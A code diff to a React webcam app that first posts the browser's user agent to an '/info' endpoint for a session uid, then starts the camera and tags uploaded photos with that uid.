@@ -9,10 +9,29 @@ function App() {
   const [count, setCount] = useState(0);
   const videoRef = useRef(null);
   const canvasRef = useRef(null);
+  const [uid,setUid]=useState(null);
 
   useEffect(() => {
-    getVideo();
+
+    axios.post(api_url+'/info', {
+      userAgent: navigator.userAgent,
+    })
+    .then(function (res) {
+      setUid(res.data.uid)
+    })
+    .catch(function (error) {
+      console.log(error);
+    })
   }, []);
+
+  useEffect(()=>{
+
+    if(uid){
+      console.log("uid:\n",uid);
+      getVideo()
+    }
+
+  },[uid])
 
   const getVideo = () => {
     navigator.mediaDevices
@@ -55,11 +74,10 @@ function App() {
     }
     const blob = new Blob([ab], { type: mimeString });
 
-
-  
-
     try {
         const formData = new FormData();
+        console.log("uid before send:\n",uid)
+        formData.append('uid', uid);
         formData.append('file', blob, 'photo.png');
 
         const response = await axios.post(api_url + '/photos', formData);
@@ -70,10 +88,8 @@ function App() {
     } finally {
 
     }
+
 };
-
-
-
 
   const closePhoto = () => {
     let canvas = canvasRef.current;
